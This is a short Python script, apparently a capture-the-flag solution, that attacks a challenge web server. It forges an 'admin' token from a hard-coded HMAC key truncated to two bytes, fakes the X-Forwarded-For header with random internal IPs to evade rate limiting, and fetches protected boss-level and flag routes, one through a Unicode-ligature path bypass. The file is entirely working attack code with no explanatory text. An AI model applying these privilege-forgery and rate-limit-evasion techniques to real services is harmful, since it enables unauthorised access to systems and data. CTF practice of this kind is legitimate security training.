import hmac
import hashlib
import time
import requests
import random

BASE = "http://1969e084-1113-4d01-9128-152294e08299.espark.tn"
SECRET_KEY = b"arcade_secret_key_2024"

username = "player"
role = "admin"
timestamp = str(int(time.time()))

message = f"{username}:{role}:{timestamp}".encode()
message_hex = message.hex()

# Compute correct 2-byte HMAC
full_hmac = hmac.new(SECRET_KEY, message, hashlib.sha256).digest()
suffix = full_hmac[:2].hex()

token = message_hex + suffix

# Rate-limit bypass with forged client IP
fake_ip = f"10.0.0.{random.randint(1, 255)}"
headers = {"X-Forwarded-For": fake_ip}

print("[*] Crafted ADMIN token:")
print(token)

# Level 2
r = requests.get(f"{BASE}/boss/level2", params={"token": token}, headers=headers)
print("\nLevel2:", r.status_code, r.text)

# Level 3
r = requests.get(f"{BASE}/boss/level3", params={"token": token}, headers=headers)
print("Level3:", r.status_code, r.text)

# Boss flag (unicode bypass)
FLAG_ROUTE = "/boss/ï¬‚ag"
r = requests.get(f"{BASE}{FLAG_ROUTE}", params={"token": token}, headers=headers)
print("\nFlag:", r.status_code, r.text)
